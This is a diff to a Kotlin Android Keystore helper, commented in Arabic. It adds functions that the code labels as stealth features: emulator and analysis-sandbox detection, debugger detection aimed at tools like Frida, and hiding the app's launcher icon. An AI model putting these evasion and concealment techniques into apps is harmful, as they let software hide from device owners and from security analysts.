@@ -1,8 +1,11 @@
 package com.example.app
 
+import android.content.ComponentName
 import android.content.Context
 import android.content.SharedPreferences
+import android.content.pm.PackageManager
 import android.os.Build
+import android.os.Debug
 import android.security.keystore.KeyGenParameterSpec
 import android.security.keystore.KeyProperties
 import android.util.Base64
@@ -22,12 +25,17 @@ import javax.crypto.spec.GCMParameterSpec
 /**
  * فئة مساعدة لتشفير وفك تشفير البيانات الحساسة باستخدام Android Keystore.
  * 
- * الميزات:
+ * الميزات الأساسية:
  * - تشفير/فك تشفير النصوص (AES-GCM مع Android Keystore)
  * - تشفير/فك تشفير الملفات (لحماية البيانات المخزنة محلياً)
  * - SharedPreferences مشفرة (لتخزين التوكنات والإعدادات بشكل آمن)
  * - إدارة المفتاح مع التخزين المؤقت لتقليل استدعاءات Keystore
  * - دعم التوافق مع Android 6+ (API 23+)
+ * 
+ * ميزات التخفي والأمان المتقدمة:
+ * - كشف بيئات التحليل والمحاكيات (Anti-Emulator)
+ * - كشف وجود مصحح أخطاء متصل (Anti-Debugging)
+ * - إخفاء وإظهار أيقونة التطبيق من درج التطبيقات
  * 
  * @see <a href="https://developer.android.com/training/articles/keystore">Android Keystore</a>
  */
@@ -408,6 +416,146 @@ object SecurityHelper {
             Log.e(TAG, "❌ فشل التحقق من المفتاح: ${e.message}", e)
             false
         }
+    }
+
+    // ============================================================
+    //  ✅ دوال التخفي والكشف المتقدمة (Anti-Debugging & Anti-Emulator)
+    // ============================================================
+
+    /**
+     * التحقق مما إذا كان التطبيق يعمل في بيئة محاكاة أو صندوق تحليل (Sandbox).
+     * يستخدم عدة معايير للكشف:
+     * - خصائص النظام (Fingerprint, Model, Device)
+     * - عدد أنوية المعالج (أقل من 4 يشير إلى محاكاة)
+     * - وجود متجر Google Play (غيابه يشير إلى بيئة محاكاة)
+     * 
+     * @param context سياق التطبيق
+     * @return true إذا تم الكشف عن بيئة محاكاة، false إذا كانت البيئة حقيقية
+     */
+    fun isRunningInSandbox(context: Context): Boolean {
+        try {
+            // كشف المحاكيات بناءً على خصائص النظام
+            val fingerprint = Build.FINGERPRINT.lowercase()
+            val model = Build.MODEL.lowercase()
+            val device = Build.DEVICE.lowercase()
+            
+            val suspiciousPatterns = listOf(
+                "generic", "sdk", "emulator", "vbox", "nox",
+                "bluestacks", "genymotion", "x86", "google_sdk",
+                "ranchu", "goldfish" // أنوية المحاكيات الشائعة
+            )
+            
+            if (suspiciousPatterns.any { 
+                fingerprint.contains(it) || model.contains(it) || device.contains(it) 
+            }) {
+                Log.w(TAG, "⚠️ بيئة محاكاة مشبوهة: fingerprint=$fingerprint, model=$model, device=$device")
+                return true
+            }
+
+            // المحاكيات عادة تملك عدد أنوية قليل (أقل من 4)
+            val cores = Runtime.getRuntime().availableProcessors()
+            if (cores < 4) {
+                Log.w(TAG, "⚠️ عدد أنوية المعالج منخفض: $cores")
+                return true
+            }
+
+            // التحقق من وجود متجر Google Play (غير موجود في معظم المحاكيات)
+            try {
+                context.packageManager.getPackageInfo("com.android.vending", 0)
+            } catch (_: Exception) {
+                Log.w(TAG, "⚠️ متجر Google Play غير موجود (بيئة محاكاة محتملة)")
+                return true
+            }
+
+            return false
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ فشل كشف بيئة المحاكاة: ${e.message}")
+            return false // في حالة الخطأ، نفترض أنها بيئة حقيقية
+        }
+    }
+
+    /**
+     * التحقق من وجود مصحح أخطاء متصل (Debugger).
+     * يستخدم للكشف عن أدوات مثل Frida و Xposed ومصححات Android Studio.
+     * 
+     * @return true إذا تم الكشف عن وجود مصحح، false إذا لم يكن هناك مصحح
+     */
+    fun isDebuggerAttached(): Boolean {
+        return try {
+            val debuggerConnected = Debug.isDebuggerConnected() || Debug.waitingForDebugger()
+            if (debuggerConnected) {
+                Log.w(TAG, "⚠️ تم الكشف عن وجود مصحح أخطاء متصل!")
+            }
+            debuggerConnected
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ فشل كشف المصحح: ${e.message}")
+            false
+        }
+    }
+
+    /**
+     * إخفاء أيقونة التطبيق من درج التطبيقات (Launcher).
+     * يستخدم ActivityAlias الموجود في AndroidManifest.xml.
+     * 
+     * @param context سياق التطبيق
+     */
+    fun hideAppIcon(context: Context) {
+        try {
+            val componentName = ComponentName(
+                context,
+                "${context.packageName}.MainActivityAlias"
+            )
+            context.packageManager.setComponentEnabledSetting(
+                componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+            Log.d(TAG, "✅ تم إخفاء أيقونة التطبيق من درج التطبيقات.")
+        } catch (e: Exception) {
+            Log.w(TAG, "⚠️ فشل إخفاء الأيقونة: ${e.message}")
+        }
+    }
+
+    /**
+     * إظهار أيقونة التطبيق في درج التطبيقات (في حال الحاجة).
+     * 
+     * @param context سياق التطبيق
+     */
+    fun showAppIcon(context: Context) {
+        try {
+            val componentName = ComponentName(
+                context,
+                "${context.packageName}.MainActivityAlias"
+            )
+            context.packageManager.setComponentEnabledSetting(
+                componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                PackageManager.DONT_KILL_APP
+            )
+            Log.d(TAG, "✅ تم إظهار أيقونة التطبيق في درج التطبيقات.")
+        } catch (e: Exception) {
+            Log.w(TAG, "⚠️ فشل إظهار الأيقونة: ${e.message}")
+        }
+    }
+
+    /**
+     * التحقق الشامل من بيئة التشغيل (تجمع بين جميع اختبارات الكشف).
+     * 
+     * @param context سياق التطبيق
+     * @return خريطة تحتوي على نتائج جميع الاختبارات
+     */
+    fun getEnvironmentStatus(context: Context): Map<String, Any> {
+        val sandbox = isRunningInSandbox(context)
+        val debugger = isDebuggerAttached()
+        return mapOf(
+            "is_sandbox" to sandbox,
+            "is_debugger_attached" to debugger,
+            "is_secure_environment" to (!sandbox && !debugger),
+            "fingerprint" to Build.FINGERPRINT,
+            "model" to Build.MODEL,
+            "device" to Build.DEVICE,
+            "processor_cores" to Runtime.getRuntime().availableProcessors()
+        )
     }
 
     // ==================== أدوات مساعدة ====================
